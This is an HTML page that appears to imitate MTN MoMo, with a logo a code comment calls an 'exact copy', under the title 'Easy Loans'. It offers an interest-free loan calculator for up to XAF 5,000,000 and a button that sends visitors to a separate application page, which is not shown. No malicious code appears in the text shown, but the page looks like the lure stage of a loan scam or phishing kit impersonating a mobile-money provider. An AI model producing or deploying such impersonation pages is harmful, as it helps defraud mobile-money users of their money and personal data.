<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>MTN MoMo – Easy Loans</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
  <style>
    :root {
      --mtn-dark: #003366;
      --mtn-gold: #FFD700;
      --mtn-light: #004080;
      --grad: linear-gradient(to right, #003366, #004080);
      --page-bg: #F5F5F5;
      --white: #FFFFFF;
      --text-dark: #1C2340;
      --text-mid: #444;
      --text-light: #888;
      --border: #ddd;
      --radius: 12px;
      --radius-sm: 8px;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
    body { font-family: 'Inter', sans-serif; background: var(--page-bg); color: var(--text-dark); min-height: 100vh; }

    /* ═══ MTN MOMO LOGO (EXACT COPY) ═══ */
    .mtn-logo { display: flex; flex-direction: column; align-items: center; gap: 4px; }
    .mtn-logo-icon { width: 45px; height: 45px; background: var(--mtn-gold); border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 1.8rem; font-weight: 900; color: var(--mtn-dark); position: relative; }
    .mtn-logo-icon::after { content: 'M'; font-size: 2rem; font-weight: 900; }
    .mtn-logo-text { font-size: 1rem; font-weight: 700; color: var(--mtn-dark); }
    .mtn-logo-sub { font-size: 0.65rem; color: #888; font-weight: 500; }

    /* ═══ NAVBAR ═══ */
    .navbar { background: var(--mtn-dark); display:flex; align-items:center; justify-content:center; padding:0 20px; height:60px; position:relative; flex-shrink:0; }
    .nav-right { position:absolute; right:20px; display:flex; flex-direction:column; gap:4px; cursor:pointer; padding:4px; }
    .hline { width:20px; height:2px; background:rgba(255,255,255,0.6); border-radius:1px; }

    /* ═══ WELCOME PAGE ═══ */
    .welcome-wrap { max-width: 440px; margin: 24px auto; padding: 0 16px; }
    .welcome-card { background: #fff; border-radius: 16px; padding: 32px 24px; box-shadow: 0 4px 20px rgba(0,0,0,0.06); }
    .welcome-title { font-size: 1.5rem; font-weight: 700; color: #1C2340; text-align: center; margin-bottom: 6px; }
    .welcome-sub { font-size: 0.9rem; color: #666; text-align: center; margin-bottom: 22px; }

    /* ═══ LOAN CALCULATOR ═══ */
    .loan-calc { background: #f9f9f9; border-radius: 12px; padding: 20px; margin-bottom: 22px; }
    .loan-calc-title { font-size: 1rem; font-weight: 600; color: #1C2340; margin-bottom: 14px; }
    .loan-row { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 0.9rem; }
    .loan-row .label { color: #555; }
    .loan-row .val { color: #FFB300; font-weight: 600; }
    .slider-wrap { margin: 16px 0 6px; }
    .slider { width: 100%; height: 6px; background: #e0e0e0; border-radius: 3px; appearance: none; -webkit-appearance: none; outline: none; }
    .slider::-webkit-slider-thumb { -webkit-appearance: none; appearance: none; width: 20px; height: 20px; background: #FFD700; border-radius: 50%; cursor: pointer; border: 3px solid #fff; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
    .slider::-moz-range-thumb { width: 20px; height: 20px; background: #FFD700; border-radius: 50%; cursor: pointer; border: 3px solid #fff; }
    .slider-limits { display: flex; justify-content: space-between; font-size: 0.75rem; color: #888; }
    .monthly-box { background: #fff; border: 1px solid #eee; border-radius: 10px; padding: 14px 18px; display: flex; justify-content: space-between; align-items: center; margin-top: 14px; }
    .monthly-box .lbl { font-size: 0.9rem; color: #555; }
    .monthly-box .amount { font-size: 1.3rem; font-weight: 700; color: #FFB300; }

    /* ═══ BUTTON ═══ */
    .btn-primary { width: 100%; background: linear-gradient(to right, #003366, #004080); color: #fff; border: none; border-radius: 10px; padding: 15px 20px; font-size: 0.95rem; font-weight: 700; letter-spacing: 0.05em; cursor: pointer; font-family: 'Inter', sans-serif; transition: opacity 0.2s; }
    .btn-primary:hover { opacity: 0.92; }
    .btn-primary:active { transform: scale(0.98); }
  </style>
</head>
<body>

  <div id="app">
    <!-- ═══ NAVBAR ═══ -->
    <div class="navbar">
      <div class="mtn-logo">
        <div class="mtn-logo-icon"></div>
        <div class="mtn-logo-text">MTN MoMo</div>
        <div class="mtn-logo-sub">Easy Loans</div>
      </div>
      <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
    </div>

    <!-- ═══ WELCOME + CALCULATOR ═══ -->
    <div class="welcome-wrap">
      <div class="welcome-card">
        <h1 class="welcome-title">Welcome to MTN MoMo</h1>
        <p class="welcome-sub">Get loans easily through MTN MoMo</p>

        <div class="loan-calc">
          <div class="loan-calc-title">Loan Calculator</div>
          <div class="loan-row">
            <span class="label">Amount</span>
            <span class="val" id="wAmount">XAF 1,000,000</span>
          </div>
          <div class="loan-row">
            <span class="label">Term</span>
            <span class="val" id="wTerm">48 Months</span>
          </div>

          <div class="slider-wrap">
            <input type="range" class="slider" id="wSlider" min="500000" max="5000000" step="50000" value="1000000" oninput="updateCalculator()">
            <div class="slider-limits">
              <span>XAF 500,000</span>
              <span>XAF 5,000,000</span>
            </div>
          </div>

          <div class="monthly-box">
            <span class="lbl">Monthly Payment</span>
            <span class="amount" id="wMonthly">XAF 20,834</span>
          </div>
        </div>

        <button class="btn-primary" onclick="startApplication()">START APPLICATION</button>
      </div>
    </div>
  </div>

  <script>
    // ═════════════════════════════════════════════════════════
    // LOAN CALCULATOR
    // ═════════════════════════════════════════════════════════
    function updateCalculator() {
      const slider = document.getElementById('wSlider');
      const amountEl = document.getElementById('wAmount');
      const termEl = document.getElementById('wTerm');
      const monthlyEl = document.getElementById('wMonthly');

      const amount = parseInt(slider.value, 10);
      const term = 48; // Fixed at 48 months
      const monthly = Math.ceil(amount / term);

      amountEl.textContent = 'XAF ' + amount.toLocaleString();
      termEl.textContent = term + ' Months';
      monthlyEl.textContent = 'XAF ' + monthly.toLocaleString();
    }

    // ═════════════════════════════════════════════════════════
    // START APPLICATION → Goes to application.html
    // ═════════════════════════════════════════════════════════
    function startApplication() {
      // Save the selected amount for the next page
      const sliderAmount = document.getElementById('wSlider').value;
      localStorage.setItem('selectedLoanAmount', sliderAmount);

      // Redirect to application page
      window.location.href = 'application.html';
    }

    // ═════════════════════════════════════════════════════════
    // INIT
    // ═════════════════════════════════════════════════════════
    document.addEventListener('DOMContentLoaded', () => {
      if (document.getElementById('wSlider')) {
        updateCalculator();
      }
    });
  </script>
</body>
</html>
